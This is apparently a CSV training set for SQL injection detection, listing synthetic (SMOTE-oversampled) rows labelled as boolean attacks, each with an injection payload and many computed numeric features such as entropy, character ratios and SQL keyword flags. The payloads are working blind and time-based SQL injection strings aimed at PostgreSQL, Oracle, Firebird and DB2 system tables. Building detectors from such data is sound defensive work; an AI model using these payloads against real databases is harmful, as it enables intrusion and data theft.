id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000278,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,0.20627682980110434,81.91597721450745,23.221097948329387,3.2887078556797253,18.442195896658774,13.0,38.34743963308904,12.126341684759648,0.22439172589991316,0.15915738453551098,0.4683878199920234,0.1480630695725524,0.03158542118991248,3.87365831524035,0.06317084237982495,0.0,1.0,1.0,0.0,6.094756263569737,0.0,0.03158542118991248,0.03158542118991248,2.063170842379825,0.03158542118991242,0.9684145788100874,0.03158542118991242,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.03158542118991259,0.0,0.0,0.03158542118991242,1.9684145788100875,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0315854211899125
SMOTE_000279,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,2.9149398520586076,88.5610925632746,26.520364187758204,3.53387949633427,26.686494688053287,13.354233687463115,35.811896812831975,12.708467374926228,0.29554840667060117,0.15357114314915127,0.40403603945335553,0.14684441072689203,0.645766312536886,1.1102230246251565e-16,0.0,0.0,0.6457663125368861,1.0,0.0,6.291532625073772,0.0,1.0,2.0627010623893414,1.6457663125368862,0.6457663125368861,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6457663125368861,0.0,0.0,0.6457663125368861,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.35423368746311396,0.3542336874631139,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000280,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.03163853391609266,154.09581989693,34.990418010306996,4.311136028640677,76.05749193815801,16.990418010306996,43.05749193815801,17.990418010307,0.49356871421878573,0.11026668654337453,0.27940820014683015,0.11675639909100954,0.990418010306998,0.009581989693002058,2.0,0.0,1.0,2.0,0.0,5.009581989693002,0.0,0.0,2.990418010306998,5.0,0.9904180103069982,0.009581989693001947,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000281,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,1.240723880514221,104.49053582439603,28.67012933692318,3.4540427384739165,29.34025867384636,13.0,46.910203243736426,15.240073906813246,0.27785985496547994,0.12622031810133014,0.4499535467357577,0.14596628019743216,0.8100184767033112,0.7599260931867553,1.6200369534066223,0.0,1.0,1.0,0.0,8.430055430109935,0.0,0.8100184767033112,0.8100184767033113,3.6200369534066223,0.8100184767033112,0.18998152329668883,0.8100184767033112,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8100184767033112,0.0,0.0,0.8100184767033112,1.1899815232966886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.8100184767033114
SMOTE_000282,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,1.3773899470542244,90.26633969846422,25.416462311540144,3.453051975031203,24.116217085388314,13.0,39.716707537691974,13.433415075383945,0.2654633013549269,0.1442397708238595,0.44086371630898724,0.1494332115122263,3.150122613075915,1.1102230246251565e-16,0.0,0.0,0.28329246230802846,1.7167075376919716,0.0,6.283292462308029,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.2832924623080285,0.0,0.0,0.28329246230802846,1.7167075376919714,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.2832924623080286
SMOTE_000283,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,0.3937318931282704,87.91362256306621,22.308637743693378,3.1232062859827074,18.0,13.0,43.530898050452976,13.382724512613244,0.20533913904013132,0.1483004893067615,0.49427283742913775,0.15208753422396937,0.0,4.0,0.0,0.0,1.0,1.0,0.0,7.382724512613244,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000284,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,3.0389350030102924,157.5066853569408,35.7533426784704,3.9414656420196814,55.93165031267679,15.698363705028818,58.1233286607648,27.753342678470407,0.3558834260098091,0.09870455174783668,0.3694123047017104,0.17599971754064378,1.3150070088528043,1.684992991147196,0.8766713392352028,0.0,0.0,1.4383356696176015,0.0,11.5616643303824,0.0,2.0,1.0,9.191678348088008,0.43833566961760145,0.5616643303823985,0.4383356696176014,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,1.0,0.0,0.4383356696176014,0.5616643303823985,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000285,attack,boolean,"1""   )    )    as gawq where 4728  =  4728 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000010,1.7364079442705633,158.77016468114965,33.52456042555906,4.023416698534577,72.25348872396073,17.90175829776376,49.71315936166141,18.90175829776376,0.44977750974215425,0.11454679345306004,0.31480677026520687,0.12086892653957886,0.0,1.0,2.0,0.0,0.7622802127795298,2.0,0.0,6.95087914888188,0.0,0.4754395744409401,1.76228021277953,6.18859893610235,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.23771978722047005,0.7622802127795298,0.0,1.0,0.7622802127795298,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.52456042555906
SMOTE_000286,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000026,2.830414855606525,147.04184082131817,32.84030680355303,3.8725332368481036,48.56276123197724,18.117852375128813,54.94107381243559,25.420153401776513,0.32838835838973496,0.12528493038031166,0.3733060526183149,0.1730206586116385,0.0,1.840306803553027,1.1596931964469728,0.0,0.0,1.5798465982234864,0.0,10.840306803553027,0.0,2.0,1.0,8.73953979467046,0.0,1.0,0.5798465982234865,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.4201534017765136,0.0,0.5798465982234866,0.42015340177651356,0.4201534017765135,0.5798465982234865,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4201534017765134
SMOTE_000287,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,2.129749212221323,135.4676146938807,32.5323853061193,4.240256112986848,70.06477061223862,12.273302857164866,37.0,16.12954122447722,0.5172409253478585,0.09050584713901583,0.27313171330753894,0.11912151420558671,0.0,0.5323853061193048,2.0,0.0,1.0,1.4676146938806953,0.0,4.532385306119306,0.5323853061193048,0.0,2.5323853061193047,4.467614693880695,0.0,0.5323853061193047,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.46761469388069526,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4676146938806953
SMOTE_000288,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   ""vfvh""  =  ""vfvh",nearest_attack_euclidean,R000024,0.8968009397732862,151.44942031030297,33.14980677010099,3.8681851584402005,56.66196861777771,11.275289844848523,57.51216184767672,26.0,0.3735333532481202,0.07508233185493153,0.3795206295150147,0.17186368538193356,0.0,3.2125483074747536,0.0,0.0,0.0,1.2125483074747538,0.0,11.574903385050494,0.0,2.0,1.0,7.212548307474753,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.7874516925252463,0.0,0.0,0.7874516925252463,1.2125483074747536,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.7874516925252464
SMOTE_000289,attack,boolean,"1""  )   where 7471  =  7471 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000020,1.0443087614578996,142.36626776251651,32.68313388125826,4.173153033404268,69.68313388125826,16.0,41.0,15.683133881258259,0.4894633438299745,0.11239099914693923,0.2880019353140318,0.11014372170905454,0.0,0.6831338812582585,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.0,5.0,0.0,0.6831338812582584,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.6831338812582586,0.31686611874174164,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000290,attack,boolean,"1%""  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000007,0.45406437176559294,135.0996958566703,32.9003041433297,4.239491022677548,70.8006082866594,9.697870996692092,37.0,17.601216573318805,0.5240742763004046,0.07174920053613289,0.2738731619446187,0.13030336121884387,0.0,0.9003041433297011,2.0,0.0,1.0,1.0996958566702988,0.0,4.9003041433297,0.9003041433297011,0.0,2.900304143329701,4.099695856670299,0.0,0.9003041433297011,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0996958566702989,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.099695856670299
SMOTE_000291,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000022,3.742766198310124,157.09441423753105,33.161108787502386,3.882897388554874,52.0305334812727,19.355564849990444,58.38609833126314,27.322217575004778,0.32844838910973967,0.12618310978361408,0.37130769712809153,0.17406080397855475,0.0,2.161108787502389,0.8388912124976106,0.0,0.0,1.4194456062488052,0.0,12.322217575004778,0.5805543937511947,2.0,2.7416631812535837,7.097228031244027,0.0,1.0,0.4194456062488053,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.41944560624880545,0.0,0.5805543937511947,0.4194456062488053,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.741663181253584,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.1611087875023895
SMOTE_000292,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,1.0472624721698094,127.41402162822098,31.182287774116283,4.1833287305414295,61.504304596065936,17.090282967844956,35.22829017725195,13.591143887058141,0.4643450778321635,0.14641963513047726,0.2797873351996463,0.10944795183771289,0.0,0.13628537098061955,2.1362853709806195,0.0,0.8637146290193805,2.0,0.0,3.8637146290193805,0.0,0.13628537098061944,1.8637146290193807,5.0,0.0,0.1362853709806195,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8637146290193806,0.0,1.0,0.8637146290193805,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.727429258038761
SMOTE_000293,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000026,2.4259768100319214,151.53229582144314,34.85968874643294,3.9590570818516664,46.24276270179372,23.52338520892784,54.383073955360786,27.383073955360786,0.30410572835052774,0.15612700399726648,0.35935998604356584,0.18040728160863992,1.42984437321647,0.5233852089278435,2.0,0.0,0.0,2.0,0.0,10.476614791072157,0.0,2.0,1.0,10.953229582144314,0.4766147910721567,0.5233852089278432,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.47661479107215665,0.0,1.0,0.0,0.47661479107215665,0.5233852089278432,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4766147910721568
SMOTE_000294,attack,boolean,"1'   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000019,2.010817583330908,95.63038819746578,28.084051759662103,3.4824648874700297,29.445402346216138,10.126077639493154,41.97485645209438,14.084051759662103,0.31591913786921266,0.10009419493387299,0.43585247385378445,0.14813419334312994,0.6806752932770169,1.1102230246251565e-16,2.0,0.0,1.0,1.319324706722983,0.0,6.7647270529391195,0.0,0.680675293277017,0.680675293277017,4.638649413445966,0.680675293277017,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.3193247067229829,1.0,0.680675293277017,0.3193247067229831,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.319324706722983
SMOTE_000295,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000025,0.5578112206917412,97.56338248181046,28.895774501212635,3.6754368242418907,36.273245450281905,11.957745012126365,37.332392019402185,12.0,0.36713619780491075,0.12411970241184263,0.38550466564114133,0.12323943414210535,1.208450997574727,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,6.478872506063182,0.0,0.8957745012126365,1.1042254987873634,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000296,attack,boolean,"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000005,1.3940869278283532,138.89848838713456,32.414069769590654,4.219878905137918,69.41406976959065,16.0,38.656279078362616,14.828139539181306,0.4999649213262054,0.11526245299289628,0.2781267937234336,0.10664583195746472,0.0,0.41406976959065334,2.0,0.0,1.0,2.0,0.0,4.414069769590654,0.0,0.0,2.0,5.0,0.0,0.4140697695906532,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.4140697695906532,0.5859302304093467,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000297,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000028,1.165180659339415,131.21824105421072,29.49764748549709,4.076088461978316,74.49764748549708,6.744118713742728,33.48353239847964,16.492942456491274,0.572157414410027,0.050198619536676495,0.25281711398252993,0.12482685207076659,3.7488237427485456,1.1102230246251565e-16,0.0,0.0,1.0,1.7488237427485456,0.0,3.497647485497092,1.4976474854970911,0.0,2.0,2.7488237427485456,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.7488237427485456,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.7488237427485456
SMOTE_000298,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000009,3.3029527798326352,106.5051500825628,28.9134913115272,3.8473238872533924,27.110710901872398,24.0,37.59629278712693,17.798146393563467,0.2388587492456884,0.2511939415414328,0.34694248229584784,0.1630048269170309,0.0,1.0,2.5144181147454665,0.0,0.0,2.0,0.0,6.399073196781733,0.0,1.485581885254533,1.0,7.427909426272667,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.48558188525453316,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000299,attack,boolean,"1'+  (  select 'wkbg' where 3921  =  3921 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  +'",nearest_attack_euclidean,R000029,2.662925191645155,146.51245274565687,37.38049810982628,4.0126152950279455,48.90249054913138,21.76099621965255,52.663486768783926,23.185479208089028,0.3346650412807572,0.14898148032953074,0.35997454492387826,0.1563789334658338,3.6195018901737246,1.1102230246251565e-16,0.7609962196525503,0.0,0.6195018901737248,2.0,0.0,9.141494329478826,0.0,1.3804981098262754,1.0,7.663486768783926,1.0,0.0,0.3804981098262752,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.3804981098262752,1.619501890173725,0.0,1.0,0.6195018901737248,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.239003780347449
SMOTE_000300,attack,boolean,"1""   )    )    and   (  1248  =  8705  )  *8705 and    (    (   ""wvma"" like ""wvma",nearest_attack_euclidean,R000017,2.7295981758122623,82.63423787729486,22.49210365427677,3.3359928017799656,19.476310962830315,13.0,37.1421342230181,13.015792691446455,0.24011405046424877,0.15900726278514504,0.4429401948231486,0.15793849192745757,1.9684146171070893,2.031585382892911,0.0,0.0,0.5078963457232276,1.4921036542767723,0.0,6.031585382892911,0.0,0.4921036542767724,0.4921036542767724,2.0,0.49210365427677233,0.5078963457232276,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000301,attack,boolean,"1"" where 3018  =  3018 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000026,0.9794681209589122,142.0,31.653250945359687,3.883496074065642,42.213621691241094,22.613003781438746,52.0,25.173374527320156,0.2972790259946556,0.15924650550308975,0.36619718309859156,0.17727728540366305,0.0,1.5201235819604704,1.6532509453596864,0.0,0.0,2.0,0.0,10.0,0.0,2.0,1.0,9.653250945359687,0.0,1.0,0.8266254726798432,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.8266254726798432,0.0,0.3467490546403136,0.8266254726798432,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000302,attack,boolean,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",nearest_attack_euclidean,R000023,0.019051686289474158,90.85065803475521,22.01493419652448,3.055748065451211,18.0,13.0,45.88052642780418,13.970131606951044,0.198166891246019,0.14312053256656926,0.5049515174781495,0.15376105870926224,0.0,4.0,0.0,0.0,1.0,1.0,0.0,7.970131606951044,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000303,attack,boolean,"1'  )   and make_set  (  4551  =  6487,6487  )   and   (  'jnqa'  =  'jnqa",nearest_attack_euclidean,R000014,0.6340887597416822,75.80953570661372,22.886904018336644,3.547511292412157,19.52975223837636,13.33928794499007,30.261919633267134,12.67857588998014,0.2617419543244689,0.17591341497646953,0.39590316112261026,0.16644146957645134,4.0,1.1102230246251565e-16,0.11309598166335666,0.0,0.0,2.0,0.0,4.452383926653427,0.2261919633267133,0.8869040183366433,1.0,2.1130959816633568,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.8869040183366432,0.11309598166335666,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000304,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000004,2.4252242219936377,81.30402056868328,22.570351731253925,3.3810991746189085,19.711055193761773,13.0,35.733668837429356,12.85929653749215,0.24684194422275352,0.1615752498674068,0.43299360232352846,0.15858920358631123,2.2814069250156983,1.7185930749843017,0.0,0.0,0.4296482687460754,1.5703517312539246,0.0,5.718593074984302,0.0,0.5703517312539246,0.5703517312539245,2.0,0.5703517312539246,0.42964826874607537,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000305,attack,boolean,"1'  )   where 4297  =  4297 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000018,0.8326429498518653,151.74269593741045,34.589581079529175,4.288041421184733,74.76874323858752,16.794790539764588,42.589581079529175,17.58958107952917,0.492686475683375,0.11069711707327984,0.28075831263912643,0.11585809460421871,0.7947905397645868,0.20520946023541342,2.0,0.0,1.0,2.0,0.0,5.0,0.0,0.0,2.7947905397645867,5.0,0.7947905397645867,0.20520946023541325,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.2052094602354133,0.7947905397645867,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
